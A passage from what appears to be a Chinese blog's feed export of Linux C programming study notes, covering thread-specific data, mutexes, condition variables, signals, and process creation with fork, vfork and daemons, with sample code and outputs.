class="comment">//睡眠以使主线程等待</span></span><br><span class="line">    pthread_key_delete(key);                              <span class="comment">//销毁键,私有数据的销毁必须在其之前,不然会内存泄漏</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mian pthread ends \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread1</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tsd = <span class="number">5</span>;                                          <span class="comment">//pthread中的私有数据</span></span><br><span class="line">    <span class="keyword">pthread_t</span> thid_1;                                     <span class="comment">//分配新的线程号</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pthread 1  %lu is running!\n&quot;</span>,pthread_self(  ));</span><br><span class="line">    pthread_setspecific(key,(<span class="keyword">void</span> *)tsd);                        <span class="comment">//使键与私有数据绑定</span></span><br><span class="line">    pthread_create(&amp;thid_1,<span class="literal">NULL</span>,thread2,<span class="literal">NULL</span>);            <span class="comment">//创建新线程</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thread1 %lu ends,pthread&#x27;s tsd is %d\n&quot;</span>,pthread_self(  ),pthread_getspecific(key));</span><br><span class="line">    sleep(<span class="number">5</span>);                                            <span class="comment">//睡眠以等待新线程结束</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread2</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tsd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pthread 2 %lu is running\n&quot;</span>,pthread_self(  ));</span><br><span class="line">    pthread_setspecific(key,(<span class="keyword">void</span> *)tsd);                       <span class="comment">//绑定键值与私有数据</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Thread %lu ends,thread&#x27;s tsd is %d\n&quot;</span>,pthread_self(  ),pthread_getspecific(key));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/c2p7mEWMRYJ1nBd.png" alt="image-20210213232526858"></p><h1 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h1><p>线程最大的特点是资源的共享性，其中的同步问题十分重要。以下是Linux中处理同步问题的常用方式。</p><h2 id="互斥锁"><a href="#互斥锁" class="headerlink" title="互斥锁"></a>互斥锁</h2><p>互斥锁通过锁机制来实现线程间的同步，在同一个时刻它通常只允许一个线程执行一个关键部分的代码。</p><p>1、使用互斥锁前必须先进行初始化操作。初始化有两种方式，一种是静态赋值法，将宏结构常量赋给互斥锁，另外一种方式是通过<code>pthread_mutex_init</code>函数初始化互斥锁。</p><p>2、初始化后就可以给给互斥锁加锁了。加锁有两个函数:<code>pthread_mutex_lock()</code>和<code>pthread_mutex_trylock()</code>。用<code>pthread_mutex_lock()</code>加锁的时候，如果mutex已经被锁住，当前尝试加锁的进程就会阻塞，直到互斥锁被其他线程释放，当<code>pthread_mutex_lock</code>函数返回时，说明互斥锁已经被当前进程成功加锁。<code>pthread_mutex_trylock</code>函数则不同，如果mutex已经被加锁，它将立即返回，返回的错误码为EBUSY，而不是阻塞等待。</p><p>3、用<code>pthread_mutex_unlock</code>函数解锁时，要满足两个条件：一是互斥锁必须处于加锁状态，二是调用本函数的线程必须是给互斥锁加锁的线程。解锁后如果有其他线程在等待互斥锁，等待队列中的第一个将获得互斥锁</p><p>4、当一个互斥锁使用完毕后，必须进行清除，清除互斥锁使用函数<code>pthread_mutex_destroy</code>。<br>清除一个互斥锁意味着释放它所占用的资源。清除锁时要求当前处于开放状态，若锁处于锁定状态，函数放回EBUSY，该函数成功之行时返回0。由于在Linux中，互斥锁并不占用内存，因此<code>pthread_mutex_destroy()</code>除了解除互斥锁的状态外没有其他操作。</p><h2 id="条件变量"><a href="#条件变量" class="headerlink" title="条件变量"></a>条件变量</h2><p>条件变量是利用线程见共享的全局变量进行同步的一种机制。条件变量宏观上类似if语句，符合条件就能执行某段程序，否则只能等待条件成立。</p><p>使用条件变量主要包括两个动作：一个等待使用资源的线程等待”条件变量被设置为真”；另一个线程在使用完资源后”设置条件为真”，这样就可以保证线程间的同步了。这样就存在一个关键问题，这就是要保证条件变量能被正确的修改，条件变量要受到特殊的保护，实际使用中互斥锁扮演者这样一个保护者的角色。Linux也提供了一系列对条件变量操作的函数。</p><p>1、与互斥锁一样，条件变量的初始话也有两种方式，一种是静态赋值法，将宏结构常量PTHREAD_COND_INITIALIZER赋给互斥锁。另一种方式是使用函数<code>pthread_cond_init</code>。</p><p>2、<code>pthread_cond_wait</code>函数释放有mutex指向的互斥锁，同时使当前线程关于cond所指向的条件变量阻塞，直到条件被信号唤醒。通常条件表达式在互斥锁的保护下求值，如果条件表达式为假，那么线程基于条件变量阻塞。当一个线程改变条件变量的同时，条件变量获得一个信号，使得条件变量的线程退出阻塞状态。<br><code>pthread_cond_timedwait</code>函数和<code>pthread_cond_wait</code>函数用法类似，差别在于<code>pthread_cond_timedwait</code>函数将阻塞直到条件变量获得信号或者经过abstime指定的时间，也就是说，如果在给定时刻前条件没有满足，则返回ETIMEOUT，结束等待。</p><p>3、线程被条件变量阻塞后，可以通过函数<code>pthread_cond_signal</code>和<code>pthread_cond_broadcast</code>激活。<br><code>pthread_cond_signal</code>激活一个等待条件成立的线程，存在多个等待线程时，按入队顺序激活其中一个，而<code>pthread_cond_broadcast</code>则激活所有等待线程。</p><p>4、当一个条件变量不再使用时，需要将其清除。清除一个条件变量通过调用<code>pthread_cond_destroy()</code>实现。<code>pthread_cond_destroy</code>函数清除由cond指向的条件变量。注意：只有在没有线程等待该条件变量的时候才能清除这个条件变量，否则返回EBUSY。</p><p>示例代码 <code>condition.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;unistd.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_mutex_t</span> mutex;</span><br><span class="line"><span class="keyword">pthread_cond_t</span> cond;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hander</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(arg);</span><br><span class="line">    (<span class="keyword">void</span>)pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread1</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pthread_cleanup_push(hander, &amp;mutex);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;thread1 is running\n&quot;</span>);</span><br><span class="line">        pthread_mutex_lock(&amp;mutex); <span class="comment">//条件变量使用时配合互斥锁使用</span></span><br><span class="line">        pthread_cond_wait(&amp;cond,&amp;mutex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;thread1 applied the condition\n&quot;</span>);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_cleanup_pop(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread2</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;thread2 is running\n&quot;</span>);</span><br><span class="line">        pthread_mutex_lock(&amp;mutex);</span><br><span class="line">        pthread_cond_wait(&amp;cond,&amp;mutex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;thread2 applied the condition\n&quot;</span>);</span><br><span class="line">        pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thid1,thid2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;condition variable study!\n&quot;</span>);</span><br><span class="line">    pthread_mutex_init(&amp;mutex,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_cond_init(&amp;cond,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;thid1,<span class="literal">NULL</span>,thread1,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_create(&amp;thid2,<span class="literal">NULL</span>,thread2,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        pthread_cond_signal(&amp;cond);</span><br><span class="line">    &#125; <span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">20</span>);</span><br><span class="line">    pthread_exit(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="异步信号"><a href="#异步信号" class="headerlink" title="异步信号"></a>异步信号</h2><p>在Linux系统中，线程是在内核外实现的，它不像进程那样在内核中实现，Linux线程本质上是轻量级的进程。信号可以被进程用来进行相互通信，一个进程通过信号通知另一个进程发生了某件事件，比如该进程所需要的输入数据已经就绪。线程同进程一样也可以接收和处理信号，信号也是一种线程同步的手段。</p><p>信号于任何线程都是异步的，也就是说信号到达线程的时间是不定的。如果有多个线程可以接收异步信号，则只有一个被选中，如果并发的多个同样的信号被送到一个进程，每一个将被不同的线程处理，如果所有的线程都屏蔽该信号，则这些信号将被挂起，直到有信号解除屏蔽来处理它们。其中函数<code>pthread_kill</code>用来向特定的线程发送信号signal，函数<code>pthread_sigmask</code>用来设置线程的信号屏蔽码，但对不允许屏蔽的Cancel信号和不允许相应的Restart信号进行了保护，函数<code>sigwait</code>用来阻塞线程。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux C编程实战之进程控制学习记录</title>
      <link href="posts/54831.html"/>
      <url>posts/54831.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>操作系统借助于进程来管理计算机的软、硬件资源，支持多任务的并行执行。而操作系统最核心的概念就是进程。以下对进程相关的学习内容进行简单记录。</p><h1 id="进程概述"><a href="#进程概述" class="headerlink" title="进程概述"></a>进程概述</h1><h2 id="进程概念"><a href="#进程概念" class="headerlink" title="进程概念"></a>进程概念</h2><p>进程是操作系统资源管理的最小单位，简单地讲就是运行中的程序。Linux系统可以同时启动多个进程。</p><blockquote><p>进程和程序的区别：</p><p>进程：是动态的，运行中的程序；</p><p>程序：是静态的，一些保存在硬盘上的可执行的代码。</p></blockquote><blockquote><p>进程和线程关系：</p><p>计算机为在同一时间执行更多任务，在进程内部又划分了许多线程。线程是比进程更小的能独立运行的基本单位。一个线程可以创建和撤销另一个线程，同一个进程中可以有多个线程并行执行。</p></blockquote><p>LInux下可通过命令 <code>ps </code> 或 <code>pstree</code> 查看当前系统中的进程。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/a1xrtgTBdIhR2CM.png" alt="image-20210206220107548"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/NjTwmiHU3hG5zCM.png" alt="image-20210206220235451"></p><h2 id="进程标识"><a href="#进程标识" class="headerlink" title="进程标识"></a>进程标识</h2><p>Linux操作系统中，每个进程都是通过唯一的进程id标识的。而这个id是一个非负数，每个进程除了id还有其他的标识信息，可以通过相应的函数获得。这些函数在<code>unistd.h</code>头文件中。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pid_t getpid(id)                             获得进程id</span><br><span class="line">pdi_t getppid(id)                            获得进程父进程的id</span><br><span class="line">pid_t getuid()                               获得进程的实际用户id</span><br><span class="line">pid_t geteuid()                              获得进程的有效用户id</span><br><span class="line">pid_t getgid()                               获得进程的实际组id</span><br><span class="line">pid_t getegid()                              获得进程的有效组id</span><br></pre></td></tr></table></figure><p><strong>实际用户id:</strong> 标识运行该进程的用户。<br><strong>有效用户id</strong>: 标识以什么用户身份来运行进程。<br><strong>实际组id</strong>: 它是实际用户所属的组id<br><strong>有效组id</strong>：有效组id是有效用户所属组的id</p><h2 id="进程结构"><a href="#进程结构" class="headerlink" title="进程结构"></a>进程结构</h2><ul><li>代码段：存放程序的可执行代码。</li><li>数据段：存放程序的全局变量、常量、静态变量。</li><li>堆栈段：<ul><li>堆用于存放动态分配的内存变量。</li><li>栈用于函数调用，存放函数的参数，内部定义的局部变量。</li></ul></li></ul><h2 id="进程状态"><a href="#进程状态" class="headerlink" title="进程状态"></a>进程状态</h2><ul><li><p>运行状态R：进程正在运行或在运行队列中等待运行。</p></li><li><p>可中断等待状态S：进程正在等待某个事件完成，等待过程中可以被信号或定时器唤醒。</p></li><li><p>不可中断等待状态D：进程也在等待某个事件完成，在等待中不可以被信号或定时器唤醒，必须等待直到等待的事件发生。</p></li><li><p>僵死状态Z：进程已终止，但进程描述符依然存在，直到父进程调用<code>wait()</code>函数后释放。</p></li><li><p>停止状态T：进程因为收到SIGSTOP、SIGSTP、SIGTIN、SIGTOU信号后停止运行或者该进程正在被跟踪(调试程序时，进程处于被跟踪状态)。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/1xPyXFRpqbWCT3w.png" alt="image-20210206223438106"></p></li></ul><p>运行时还会有一些后缀字符，其意义分别为&lt;(高优先级进程),N(低优先级队列),L(内存锁页，即页不可以被换出内存),s(该进程为会话首进程),l(多线程进程),+(进程位于前台进程组)。</p><h2 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h2><p>Linux进程控制包括创建进程、执行新程序、退出进程及改变进程优先级等。</p><p>在Linux系统中，用于对进程进行控制的主要系统调用以下所示:</p><ul><li>fork：用于创建一个新进程</li><li>exit：用于终止进程</li><li>exec：用于执行一个应用程序</li><li>wait：将父进程挂起，等待子进程终止</li><li>getpid： 获取当前进程的ID</li><li>nice： 改变进程的优先级</li></ul><h1 id="进程操作"><a href="#进程操作" class="headerlink" title="进程操作"></a>进程操作</h1><h2 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h2><h3 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h3><p>创建进程有两种方式，一种是由操作系统创建，二是由父进程创建。</p><p>由操作系统创建的进程。它们是平等的，不存在资源继承关系。而对于父进程创建的进程他们和父进程存在隶属关系。子进程又可以创建进程，这样形成了一个进程家族。子进程可以继承其父进程几乎所有的资源。在系统启动的时候会，操作系统会创建一些进程，它们承担着管理和分配系统资源的任务，这些进程通常被称为系统进程。</p><blockquote><p>系统调用<code>fork</code>是创建一个新进程的唯一方法，除了极少数的方式创建的进程，如<code>init</code>进程，它是内核启动时以特殊方式创建的。进程调用<code>fork</code>函数就是创建了一个子进程。</p></blockquote><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p><code>fork</code>函数调用的时候会返回两个值，实际上调用成功后，当前进程分裂为两个进程，一个是原来的父进程，另一个是刚刚创建的子进程。父子进程在调用<code>fork</code>函数的地方分开，<code>fork</code>函数有两个返回值，一个是函数的父进程调用<code>fork</code>函数后的返回值，这个返回值是刚刚创建的子进程的ID，另一个是子进程中<code>fork</code>函数的返回值，这个返回值是0。<code>fork</code>函数返回两个值的前提是进程创建成功，，如果失败只会返回-1。</p><p>例如 <code>fork.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> fpid; <span class="comment">//fpid表示fork函数的返回值</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    fpid = fork();</span><br><span class="line">    <span class="keyword">if</span> (fpid &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;error in fork!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (fpid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I am the child process, my process id is %d\n&quot;</span>, getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;我是爹的儿子\n&quot;</span>);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I am the parent process, my process id is %d\n&quot;</span>, getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;我是孩子他爹\n&quot;</span>);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;统计结果是: %d\n&quot;</span>, count);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wyw@linux:~/linux_c$ ./fork</span><br><span class="line">I am the parent process, my process id is 36738</span><br><span class="line">我是孩子他爹</span><br><span class="line">统计结果是: 1</span><br><span class="line">I am the child process, my process id is 36739</span><br><span class="line">我是爹的儿子</span><br><span class="line">统计结果是: 1</span><br></pre></td></tr></table></figure><blockquote><p>注意：用 <code>fork</code> 创建子进程后，父子进程的执行顺序是不确定的。</p></blockquote><p><strong>属性继承</strong></p><p><code>fork</code>创建的子进程会继承父进程的很多属性，主要包括用户ID、组ID、当前工作目录、根目录、打开的文件、创建的文件使用的屏蔽字、信号屏蔽子、上下文环境、共享存储段、资源限制等。</p><h3 id="孤儿进程"><a href="#孤儿进程" class="headerlink" title="孤儿进程"></a>孤儿进程</h3><p>孤儿进程就是一个子进程的父进程先于子进程结束，子进程就成为了一个孤儿进程，它由<code>init</code>进程收养，成为init进程的子进程。</p><h3 id="vfork函数"><a href="#vfork函数" class="headerlink" title="vfork函数"></a>vfork函数</h3><p><code>vfork</code>也可以创建新进程，与<code>fork</code>相比，它有自己独特的用处。</p><ul><li><code>vfork</code>和<code>fork</code>一样都是调用一次，返回两次。</li><li>使用<code>fork</code>创建一个子进程时，子进程只是完全复制父进程的资源。这样得到的子进程独立于父进程，并具有良好的并发行。而使用<code>vfork</code>创建一个子进程时，操作系统并不将父进程的地址空间完全复制到子进程，用<code>vfork</code>创建的子进程共享父进程的地址空间，也就是子进程完全运行在父进程地址空间上，子进程对地址空间任何修改对父进程都是可见的。</li><li><code>fork</code>创建的子进程，哪个进程先运行取决于系统的调度算法，但是<code>vfork</code>一个进程时，保证子进程先运行，当他调用<code>exec</code>或者<code>exit</code>之后，父进程才可能被调度运行。如果在<code>exiec</code>或者<code>exit</code>之前要依赖父进程的某个行为，就会导致死锁。</li><li>同时<code>fork</code>创建一个子进程所有父进程的资源都要复制，有时候子进程只是调用一个<code>exec</code>，所以这样会浪费大量的系统资源。而<code>vfork</code> 不会拷贝父进程的地址空间，这样减小了系统开销。</li></ul><p>例如：<code>vfork.c</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">pid = vfork();<span class="comment">// 创建进程</span></span><br><span class="line"><span class="keyword">if</span>(pid &lt; <span class="number">0</span>)&#123; <span class="comment">// 出错</span></span><br><span class="line">perror(<span class="string">&quot;vfork&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="number">0</span> == pid)&#123; <span class="comment">// 子进程</span></span><br><span class="line">sleep(<span class="number">3</span>); <span class="comment">// 延时 3 秒</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i am son\n&quot;</span>);</span><br><span class="line">        a = <span class="number">100</span>, b = <span class="number">200</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;son: a = %d, b = %d\n&quot;</span>, a, b);</span><br><span class="line">_exit(<span class="number">0</span>); <span class="comment">// 退出子进程，必须</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123; <span class="comment">// 父进程</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;i am father\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;father: a = %d, b = %d\n&quot;</span>, a, b);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wyw@linux:~/linux_c$ ./vfork</span><br><span class="line">i am son</span><br><span class="line">son: a = 100, b = 200</span><br><span class="line">i am father</span><br><span class="line">father: a = 100, b = 200</span><br></pre></td></tr></table></figure><p>说明：上面的代码，已经让子进程延时 3 s， 结果还是子进程运行结束后，父进程才执行。</p><p>子进程修改 a, b 的值，会影响到父进程的 a, b, </p><blockquote><p>注意：用 vfork() 创建进程，子进程里一定要调用 exec（进程替换） 或 exit（退出进程），否则，程序会出问题，没有意义。</p></blockquote><h2 id="创建守护进程"><a href="#创建守护进程" class="headerlink" title="创建守护进程"></a>创建守护进程</h2><p>守护进程(daemon)是指在后台运行的、没有控制终端与之相连的进程。他独立于控制终端，通常周期性地执行某种任务。Linux大多数服务器就是用守护进程方式实现的，类似windows的系统服务。</p><blockquote><p>会话和进程组</p><p>进程组是一组相关进程的集合，会话是一组相关进程组的集合。</p><p>当有新的用户登录Linux时，登录进程会为这个用户创建一个会话。用户的登录shell就是会话的首进程。会话的首进程ID会作为整个会话的ID。会话是一个或多个进程组的集合，囊括了登录用户的所有活动。在登录shell时，用户可能会使用管道，让多个进程互相配合完成一项工作，这一组进程属于同一个进程组。</p><p>通常，会话开始于用户登录，终止于用户退出，期间的所有进程都属于这个会话。一个会话一般包含一个会话首进程、一个前台进程组和一个后台进程组，控制终端可有可无；此外，前台进程组只有一个，后台进程组可以有多个，这些进程组共享一个控制终端。</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/JjZqQIen5hOfRzm.png" alt="image-20210207211130893"></p><p>创建步骤：</p><ul><li>fork()创建子进程，父进程exit()退出</li><li>在子进程调用setsid()创建新会话</li><li>再次 fork() 一个子进程，父进程exit退出</li><li>在子进程中调用chdir()让根目录“/”成为子进程的工作目录</li><li>在子进程中调用umask()重设文件权限掩码为0</li><li>在子进程中调用close()关闭不需要的文件描述符</li><li>守护进程退出处理</li></ul><p>例如：<code>daemon.c</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> 